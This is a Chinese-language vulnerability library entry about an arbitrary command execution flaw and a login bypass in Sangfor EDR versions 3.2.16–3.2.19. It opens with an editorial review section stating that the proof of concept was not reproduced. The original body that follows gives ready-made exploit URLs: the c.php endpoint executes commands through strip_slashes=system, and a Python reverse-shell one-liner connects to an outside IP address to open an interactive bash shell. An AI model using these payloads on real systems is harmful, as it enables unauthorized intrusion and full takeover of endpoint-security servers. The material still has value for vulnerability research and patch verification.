---
source: "白阁文库 BaizeSec/bylibrary"
id: "vw-8ba556a9b18ec0ff4eeb17d7"
entity_id: "ve-8ba556a9b18ec0ff4eeb17d7"
schema_version: "1"
title: "深信服EDR任意命令执行漏洞"
product: "Sangfor EDR"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "3.2.16/17/19；明确用户名必须存在"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据；回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE"
source_status: "unknown"
---

# 深信服EDR任意命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor EDR
- 本文讨论：c.php命令执行 + ui/login.php认证绕过
- 版本、权限与配置前提：3.2.16/17/19；明确用户名必须存在
- 资料类型：EDR登录绕过和RCE聚合摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 正文中再嵌第二组frontmatter；1.jpg/2.jpg/3.jpg仅文件名无有效链接
- 反弹URL未编码；没有认证绕过是否RCE必需的说明或修复

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
- 回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE

### 待核与来源

- 链依赖关系、版本和原图素材待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


---
title: '深信服EDR任意命令执行漏洞'
date: Fri, 04 Sep 2020 05:26:04 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞范围

EDR 3.2.16、3.2.17、3.2.19

### 漏洞POC

参数host/path/row/limit=命令 即可执行命令

```
https://*****/tool/log/c.php?strip_slashes=system&host=id
https://*****/tool/log/c.php?strip_slashes=system&path=id
https://*****/tool/log/c.php?strip_slashes=system&row=id
https://*****/tool/log/c.php?strip_slashes=system&limit=id
```


```bash
#越权登录
https://ip:xx/ui/login.php?user=admin   #(用户名必须存在)
#命令执行
https://xx.xx.xx.37/tool/log/c.php?strip_slashes=system&host=id
https://xx.xx.xx.37/tool/log/c.php?strip_slashes=system&host=whoami
#反弹shell
https://xx.xx.xx.37/tool/log/c.php?strip_slashes=system&path=python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xx.xx.xx.105',1919));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```



> **图片待核**：原归档在此处仅保留文件名 `1.jpg`，没有可对应的图片引用。



> **图片待核**：原归档在此处仅保留文件名 `2.jpg`，没有可对应的图片引用。



> **图片待核**：原归档在此处仅保留文件名 `3.jpg`，没有可对应的图片引用。


---

> 来源：白阁文库 BaizeSec/bylibrary
